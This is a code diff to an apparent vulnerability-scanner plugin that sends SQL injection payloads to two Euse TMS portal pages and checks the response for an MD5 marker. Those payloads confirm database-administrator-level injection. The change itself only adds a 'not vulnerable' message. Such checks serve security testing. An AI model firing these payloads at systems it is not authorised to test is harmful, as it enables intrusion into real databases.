@@ -28,14 +28,18 @@ class euse_study_multi_sqli_BaseVerify:
                     "/NewPortal/download.aspx?fileid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%", 
                     "/NewPortal/content_show.aspx?contentid=1%27AnD%20Sys.Fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0%20AnD%27%%27=%27%"]
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在Euse TMS DBA权限SQL注入...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在euse_study_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
